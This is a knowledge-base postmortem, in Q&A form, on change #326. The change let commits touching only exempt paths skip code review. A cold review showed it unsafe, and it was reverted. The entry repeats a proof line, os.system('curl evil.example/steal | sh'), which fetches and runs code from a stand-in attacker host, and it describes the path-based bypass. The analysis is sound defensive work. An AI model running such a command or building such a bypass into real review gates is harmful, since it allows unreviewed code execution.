---
type: "query"
date: "2026-08-16T05:31:22.562062+00:00"
question: "I armed a gate relaxation 4/4 with a control arm — does that mean it was safe?"
contributor: "graphify"
outcome: "corrected"
correction: "No. The boundaries were all correct and the PREMISE was wrong, which is the one\nthing a mutation sweep structurally cannot measure.\n\nThe change (#326): let `kb-ship`/`kb-land` accept a commit with NO receipt when\nevery path on the branch is inside `review.EXEMPT_PATHS`. Armed with a spec file\n`2026-08-16-exempt-only-branch-arms.toml` — WHICH NO LONGER EXISTS, because the\nrevert deleted it along with the code it armed. So this figure is a transcript\nclaim with no artifact behind it, said plainly rather than citing a path that\nresolves nowhere; the executed repro that matters is on issue #326. The sweep\nread: 4/4 arms died, 1/1 control held,\nincluding the fail-OPEN direction (treating \"could not resolve the base\" as\n\"nothing changed, so it is exempt\"). Every boundary I could name was checked and\nwas right: a mixed exempt+code delta refuses, `require_base=None` never reaches\nthe route, a bogus ref fails closed, an empty delta fails closed.\n\nThe cold lane rated it HIGH in one pass. `_is_exempt` matches a PATH, never\ncontent — already true before the change — so ANY file under\ngraphify-out/memory/ now shipped with zero review regardless of its bytes:\n\n    graphify-out/memory/totally-a-memory-file.md\n        import os; os.system(\"curl evil.example/steal | sh\")\n    -> (True, 'no receipt required ... nothing here is code a lane could read')\n\nAlso via `git mv` of real code into that directory in a second commit. Reproduced\nindependently before reverting.\n\nWhat I had failed to credit: #66's ancestor requirement was not bookkeeping. It\nguaranteed at least one lane had reviewed SOMETHING on the branch — a weak\nguarantee, and the only thing bounding a path-based allowlist. Removing it made\nthe path list the entire boundary.\n\nThe durable rules:\n\n1. A path-based exemption is only as safe as whatever ELSE still requires a\n   review. #66 was safe because it relaxed WHICH receipt is consulted while\n   still demanding one. Relaxing to zero receipts is a different kind of change\n   wearing the same clothes.\n\n2. A clean mutation sweep on a gate RELAXATION is evidence of nothing. The arms\n   test that the boundaries you thought of hold. They cannot ask whether the\n   boundary set is the right one, and on a relaxation that is the entire\n   question. Send a relaxation to a cold reader before believing your own arms.\n"
---

# Q: I armed a gate relaxation 4/4 with a control arm — does that mean it was safe?

## Answer

No. The boundaries were all correct and the PREMISE was wrong, which is the one
thing a mutation sweep structurally cannot measure.

The change (#326): let `kb-ship`/`kb-land` accept a commit with NO receipt when
every path on the branch is inside `review.EXEMPT_PATHS`. Armed with a spec file
`2026-08-16-exempt-only-branch-arms.toml` — WHICH NO LONGER EXISTS, because the
revert deleted it along with the code it armed. So this figure is a transcript
claim with no artifact behind it, said plainly rather than citing a path that
resolves nowhere; the executed repro that matters is on issue #326. The sweep
read: 4/4 arms died, 1/1 control held,
including the fail-OPEN direction (treating "could not resolve the base" as
"nothing changed, so it is exempt"). Every boundary I could name was checked and
was right: a mixed exempt+code delta refuses, `require_base=None` never reaches
the route, a bogus ref fails closed, an empty delta fails closed.

The cold lane rated it HIGH in one pass. `_is_exempt` matches a PATH, never
content — already true before the change — so ANY file under
graphify-out/memory/ now shipped with zero review regardless of its bytes:

    graphify-out/memory/totally-a-memory-file.md
        import os; os.system("curl evil.example/steal | sh")
    -> (True, 'no receipt required ... nothing here is code a lane could read')

Also via `git mv` of real code into that directory in a second commit. Reproduced
independently before reverting.

What I had failed to credit: #66's ancestor requirement was not bookkeeping. It
guaranteed at least one lane had reviewed SOMETHING on the branch — a weak
guarantee, and the only thing bounding a path-based allowlist. Removing it made
the path list the entire boundary.

The durable rules:

1. A path-based exemption is only as safe as whatever ELSE still requires a
   review. #66 was safe because it relaxed WHICH receipt is consulted while
   still demanding one. Relaxing to zero receipts is a different kind of change
   wearing the same clothes.

2. A clean mutation sweep on a gate RELAXATION is evidence of nothing. The arms
   test that the boundaries you thought of hold. They cannot ask whether the
   boundary set is the right one, and on a relaxation that is the entire
   question. Send a relaxation to a cold reader before believing your own arms.


## Outcome

- Signal: corrected
- Correction: No. The boundaries were all correct and the PREMISE was wrong, which is the one
thing a mutation sweep structurally cannot measure.

The change (#326): let `kb-ship`/`kb-land` accept a commit with NO receipt when
every path on the branch is inside `review.EXEMPT_PATHS`. Armed with a spec file
`2026-08-16-exempt-only-branch-arms.toml` — WHICH NO LONGER EXISTS, because the
revert deleted it along with the code it armed. So this figure is a transcript
claim with no artifact behind it, said plainly rather than citing a path that
resolves nowhere; the executed repro that matters is on issue #326. The sweep
read: 4/4 arms died, 1/1 control held,
including the fail-OPEN direction (treating "could not resolve the base" as
"nothing changed, so it is exempt"). Every boundary I could name was checked and
was right: a mixed exempt+code delta refuses, `require_base=None` never reaches
the route, a bogus ref fails closed, an empty delta fails closed.

The cold lane rated it HIGH in one pass. `_is_exempt` matches a PATH, never
content — already true before the change — so ANY file under
graphify-out/memory/ now shipped with zero review regardless of its bytes:

    graphify-out/memory/totally-a-memory-file.md
        import os; os.system("curl evil.example/steal | sh")
    -> (True, 'no receipt required ... nothing here is code a lane could read')

Also via `git mv` of real code into that directory in a second commit. Reproduced
independently before reverting.

What I had failed to credit: #66's ancestor requirement was not bookkeeping. It
guaranteed at least one lane had reviewed SOMETHING on the branch — a weak
guarantee, and the only thing bounding a path-based allowlist. Removing it made
the path list the entire boundary.

The durable rules:

1. A path-based exemption is only as safe as whatever ELSE still requires a
   review. #66 was safe because it relaxed WHICH receipt is consulted while
   still demanding one. Relaxing to zero receipts is a different kind of change
   wearing the same clothes.

2. A clean mutation sweep on a gate RELAXATION is evidence of nothing. The arms
   test that the boundaries you thought of hold. They cannot ask whether the
   boundary set is the right one, and on a relaxation that is the entire
   question. Send a relaxation to a cold reader before believing your own arms.
